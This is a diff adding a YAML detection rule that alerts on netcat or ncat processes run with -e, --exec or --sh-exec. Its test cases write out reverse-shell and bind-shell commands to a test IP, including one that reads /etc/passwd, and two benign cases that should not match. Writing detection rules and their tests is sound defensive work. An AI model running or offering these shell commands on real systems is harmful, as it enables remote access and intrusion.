@@ -1,0 +1,32 @@
+name: ncat_reverse_shell
+mode: alert
+eval: |
+  (
+    (e.process_name == "nc" || e.process_name == "ncat" || e.process_name == "nmap") &&
+    re_match(e.process_args, "(-e\\s+|-c\\s+|--exec\\s+|--sh-exec\\s+)")
+  )
+tests:
+  - cleartext: "ncat -e /bin/bash 10.0.0.1 4444"
+    process_name: ncat
+    process_args: "ncat -e /bin/bash 10.0.0.1 4444"
+    should_match: true
+  - cleartext: "nc 10.0.0.1 4444 -e /bin/sh"
+    process_name: nc
+    process_args: "nc 10.0.0.1 4444 -e /bin/sh"
+    should_match: true
+  - cleartext: "ncat --exec /bin/bash -l -p 4444"
+    process_name: ncat
+    process_args: "ncat --exec /bin/bash -l -p 4444"
+    should_match: true
+  - cleartext: "ncat --sh-exec 'cat /etc/passwd' -l -p 8080"
+    process_name: ncat
+    process_args: "ncat --sh-exec cat /etc/passwd -l -p 8080"
+    should_match: true
+  - cleartext: "nc -zv example.com 80 (port scan, benign)"
+    process_name: nc
+    process_args: "nc -zv example.com 80"
+    should_match: false
+  - cleartext: "nc -l 8080 (simple listener, no exec)"
+    process_name: nc
+    process_args: "nc -l 8080"
+    should_match: false
